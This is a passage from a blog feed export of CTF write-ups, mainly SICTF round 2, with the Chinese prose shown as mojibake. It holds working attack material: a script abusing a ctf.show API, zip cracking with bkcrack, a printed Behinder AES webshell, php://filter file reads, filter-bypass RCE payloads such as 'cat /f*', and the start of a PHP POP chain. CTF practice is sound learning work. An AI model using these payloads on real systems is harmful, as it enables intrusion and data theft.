class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">x=5</span><br><span class="line">url=&quot;http://274ff6c1-4707-4493-90e6-f0bddae37424.challenge.ctf.show/api/amount.php&quot;</span><br><span class="line">url2=&quot;http://274ff6c1-4707-4493-90e6-f0bddae37424.challenge.ctf.show/api/getFlag.php&quot;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;PHPSESSID=2og1nbla83d4tkt7qiksqjvdpl&#x27;&#125;  #è‡ªå·±ç™»å½•åçš„sessionid</span><br><span class="line">while True:</span><br><span class="line">   print(x)</span><br><span class="line">   t=x-1</span><br><span class="line">   data=&#123;</span><br><span class="line">   &#x27;u&#x27;:&#x27;111&#x27;, #æ³¨å†Œçš„ç”¨æˆ·å</span><br><span class="line">   &#x27;a&#x27;:str(t)</span><br><span class="line">   &#125;</span><br><span class="line">   r=requests.post(url,headers=headers,data=data)</span><br><span class="line">   print(r.text)</span><br><span class="line">   if(x&gt;10000):</span><br><span class="line">      r2=requests.get(url2,headers=headers)</span><br><span class="line">      print(r2.text)</span><br><span class="line">      break</span><br><span class="line">   x+=t</span><br></pre></td></tr></table></figure></script></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF-2nd</title>
      <link href="/2023/09/10/SICTF-2nd/"/>
      <url>/2023/09/10/SICTF-2nd/</url>
      
        <content type="html"><![CDATA[<p>æ¯”èµ›æ‰“å®Œäº†ï¼Œè™½ç„¶æ˜¯ä¸ªå…¬ç›Šèµ›ï¼Œä¹Ÿæ˜¯æ‹¿åˆ°äº†åæ¬¡ï¼Œå¯æ˜¯è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ï¼Œåªèƒ½åšäº›ç®€å•é¢˜ã€‚ã€‚ã€‚</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="ç­¾åˆ°-Welcome"><a href="#ç­¾åˆ°-Welcome" class="headerlink" title="ç­¾åˆ°]Welcome"></a>ç­¾åˆ°]Welcome</h3><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194808039-1700990465940-271.png"></p><h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL import Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€PNGå›¾åƒæ–‡ä»¶</span></span><br><span class="line">image = Image.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;image.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å›¾åƒçš„å®½åº¦å’Œé«˜åº¦</span></span><br><span class="line">width, height = image.size</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ¯ä¸ªåƒç´ </span></span><br><span class="line"><span class="keyword">for</span> y in <span class="title function_ invoke__">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> x in <span class="title function_ invoke__">range</span>(width):</span><br><span class="line">        <span class="comment"># è·å–åƒç´ çš„RGBå€¼</span></span><br><span class="line">        r, g, b = image.<span class="title function_ invoke__">getpixel</span>((x, y))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆ¤æ–­RGBå€¼å¹¶è¾“å‡ºç›¸åº”å­—ç¬¦</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">46</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif r == <span class="number">33</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif r == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> g == <span class="number">46</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif g == <span class="number">33</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif g == <span class="number">63</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">46</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif b == <span class="number">33</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif b == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>â€¦â€¦â€¦â€¦â€¦â€¦!?!!.?â€¦â€¦â€¦â€¦â€¦â€¦?.?!.?â€¦.!.?â€¦â€¦.!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?â€¦â€¦â€¦!?!!.?â€¦â€¦..?.?!.?..!.?â€¦â€¦.!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?â€¦â€¦â€¦â€¦â€¦!?!!.?â€¦â€¦â€¦â€¦..?.?!.?â€¦â€¦..!.?â€¦â€¦â€¦â€¦â€¦..!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!â€¦!â€¦â€¦.!.!!!!!!!.?â€¦â€¦â€¦â€¦.!?!!.?â€¦â€¦â€¦â€¦?.?!.?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦!â€¦..!.?â€¦â€¦â€¦â€¦.!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!â€¦..!.!!!!!!!!!!!!!!!!!.?â€¦â€¦â€¦â€¦â€¦!?!!.?â€¦â€¦â€¦â€¦..?.?!.?â€¦â€¦â€¦â€¦..!.!!!!!.?â€¦â€¦â€¦â€¦â€¦!?!!.?!!!!!!!!!!!!!!?.?!.?!!!â€¦â€¦â€¦â€¦â€¦..!.?â€¦â€¦.!?!!.?!!!!!!?.?!.?!!!!!!!â€¦â€¦â€¦â€¦â€¦!.?â€¦â€¦â€¦â€¦.!?!!.?â€¦â€¦â€¦â€¦?.?!.?â€¦â€¦â€¦â€¦â€¦â€¦â€¦.!â€¦..!.!.?â€¦â€¦â€¦â€¦â€¦!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?â€¦â€¦â€¦â€¦â€¦!?!!.?â€¦â€¦â€¦â€¦..?.?!.?â€¦â€¦!.?â€¦â€¦â€¦â€¦.!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!â€¦â€¦â€¦â€¦.!.!!!!!!!!!!!!!!!!!!!â€¦â€¦â€¦..!.!â€¦â€¦â€¦â€¦.!.!!!!!!!!!!!!!!!!!â€¦â€¦â€¦..!.?â€¦â€¦â€¦â€¦â€¦!?!!.?â€¦â€¦â€¦â€¦..?.?!.?!.!!!!!.!!!!!â€¦â€¦.!.!!!.?â€¦â€¦â€¦â€¦.!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?â€¦â€¦â€¦â€¦â€¦..!?!!.?â€¦â€¦â€¦â€¦â€¦.?.?!.?â€¦â€¦â€¦â€¦!.?.</p></blockquote><p>Short Ook</p><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452</span><br><span class="line">bkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</span><br></pre></td></tr></table></figure><p>010æŸ¥çœ‹flagåœ¨æœ€å</p><h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3><p>AESå†°è3æµé‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;2295d22e2d70888f&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">                <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                             <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">key = <span class="string">&#x27;2295d22e2d70888f&#x27;</span></span><br></pre></td></tr></table></figure><p>è§£å†°èæµé‡</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194824995-1700990465940-272.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span><br></pre></td></tr></table></figure><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194834595-1700990465940-274.png"></p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194844075-1700990465940-273.png"></p><p>å˜å¼‚å‡¯æ’’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">decrypt_string</span>(ciphertext, offsets):</span><br><span class="line">    decrypted_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    offset_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char in ciphertext:</span><br><span class="line">        offset = offsets[offset_index] % <span class="number">26</span></span><br><span class="line">        decrypted_char_code = (<span class="title function_ invoke__">ord</span>(char) - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) - offset) % <span class="number">26</span> + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        decrypted_char = <span class="title function_ invoke__">chr</span>(decrypted_char_code)</span><br><span class="line">        decrypted_string += decrypted_char</span><br><span class="line"></span><br><span class="line">        offset_index = (offset_index + <span class="number">1</span>) % <span class="title function_ invoke__">len</span>(offsets)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_string</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;</span></span><br><span class="line">offsets = [<span class="number">1</span>, <span class="number">50</span>, <span class="number">61</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">20</span>, <span class="number">63</span>, <span class="number">41</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    decrypted_string = <span class="title function_ invoke__">decrypt_string</span>(ciphertext, offsets)</span><br><span class="line">    <span class="keyword">print</span>(decrypted_string)</span><br></pre></td></tr></table></figure><p>FLAGï¼šSICTFSHUMUISAGOODBOYYYYYYYYY</p><h3 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h3><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194855104-1700990465940-275.png"></p><p>morseè§£å¯†</p><p>å¾—åˆ°falg</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194905075-1700990465940-277.png"></p><p>å˜æˆå°å†™</p><h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºè°ƒè¯•æ¨¡å¼</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå›¾ç‰‡å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”Ÿæˆå›¾ç‰‡æ•°ç»„</span></span><br><span class="line">    image_array = [[<span class="number">255</span> <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> bit <span class="keyword">in</span> line.strip()] <span class="keyword">for</span> line <span class="keyword">in</span> lines]</span><br><span class="line">    image_array = np.array(image_array, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿å­˜ä¸ºå›¾ç‰‡</span></span><br><span class="line">    plt.imsave(<span class="string">&#x27;output.png&#x27;</span>, image_array, cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–äºŒç»´ç å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qr_code</span>(<span class="params">image_path</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    decoded_objects = decode(image)</span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> decoded_objects:</span><br><span class="line">        <span class="keyword">return</span> obj.data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥æœåŠ¡å™¨</span></span><br><span class="line">conn = remote(<span class="string">&#x27;210.44.151.51&#x27;</span>, <span class="number">10365</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># ä»æœåŠ¡å™¨æ¥æ”¶æ•°æ®</span></span><br><span class="line">        data = conn.recvuntil(<span class="string">&#x27;Please Decrypt this QR code:&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†æ•°æ®ä¿å­˜åˆ°æ–‡æœ¬æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(data.decode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä»æ–‡æœ¬æ–‡ä»¶åˆ›å»ºå›¾ç‰‡</span></span><br><span class="line">        create_image(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¯»å–å›¾ç‰‡ä¸­çš„äºŒç»´ç </span></span><br><span class="line">        code = read_qr_code(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å‘é€äºŒç»´ç åˆ°æœåŠ¡å™¨</span></span><br><span class="line">        conn.sendline(<span class="built_in">str</span>(code))</span><br><span class="line">        conn.recvline()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># å…³é—­æ–‡ä»¶</span></span><br><span class="line">        file.close()</span><br></pre></td></tr></table></figure><h3 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h3><p>ç¬¬ä¸‰é“å°±æ˜¯flag</p><p>SICTF{SICTF_Round3_will_do_even_better!}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="ç­¾åˆ°-Include"><a href="#ç­¾åˆ°-Include" class="headerlink" title="[ç­¾åˆ°]Include"></a>[ç­¾åˆ°]Include</h3><p>åˆ©ç”¨ä¼ªåè®®å¯ç›´æ¥è¯»åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?SICTF=php://<span class="built_in">filter</span>/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h3 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/_|%5f|\.|%2E/i&#x27;, $query)) &#123;</span><br><span class="line">    die(&#x27;You are Hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#x27;k_e_y&#x27;] !==&#x27;123&#x27; &amp;&amp; preg_match(&#x27;/^123$/&#x27;,$_GET[&#x27;k_e_y&#x27;]))&#123;</span><br><span class="line">    echo(&quot;You are will Win!&lt;br&gt;&quot;);</span><br><span class="line">    if(isset($_POST[&#x27;command&#x27;]))&#123;</span><br><span class="line">        $command = $_POST[&#x27;command&#x27;];</span><br><span class="line">        if(!preg_match(&quot;/\~|\`|\@|\#|\\$|\%|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\+|\=|\&#123;|\&#125;|\[|\]|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;,$command))&#123;</span><br><span class="line">            eval($command);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo(&quot;You are Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo(&quot;K_e_y is Errors!&quot;);</span><br><span class="line">&#125;K_e_y is Errors!</span><br></pre></td></tr></table></figure><p>ä»£ç å¼€å§‹ä¼šå¯¹è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œè·Ÿ_æœ‰å…³çš„urlç¼–ç ä¹‹ç±»çš„å…¨éƒ¨è¿‡æ»¤</p><p>å¯ä»¥ç”¨ç©ºæ ¼æˆ–è€….ä»£æ›¿_,.åˆè¢«è¿‡æ»¤äº†ï¼Œç”¨äº†ç©ºæ ¼ï¼Œåé¢ä¸€ä¸ªç®€å•çš„è‹¥æ¯”è¾ƒæ¢è¡Œç¬¦ç»•è¿‡</p><p>åé¢cmdä¸€ä¸ªæ— æ•°å­—å­—æ¯rce</p><p>å¯è§ctfshow  web40çš„é¢˜è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?k%20e%20y=123%0a</span><br><span class="line">command=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$code = $_POST[&#x27;code&#x27;]; </span><br><span class="line">$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); </span><br><span class="line">$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); </span><br><span class="line">eval($code); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å€Ÿé‰´å®çˆ·æ–‡ç« </p><p><a href="https://blog.csdn.net/qq_63928796/article/details/127963079">https://blog.csdn.net/qq_63928796/article/details/127963079</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=cat /f*</span><br></pre></td></tr></table></figure><h3 id="æˆ‘å…¨éƒ½è¦"><a href="#æˆ‘å…¨éƒ½è¦" class="headerlink" title="æˆ‘å…¨éƒ½è¦"></a>æˆ‘å…¨éƒ½è¦</h3><p>POP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span> = <span class="string">&#x27;233333333&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/233333333/&quot;</span>,<span 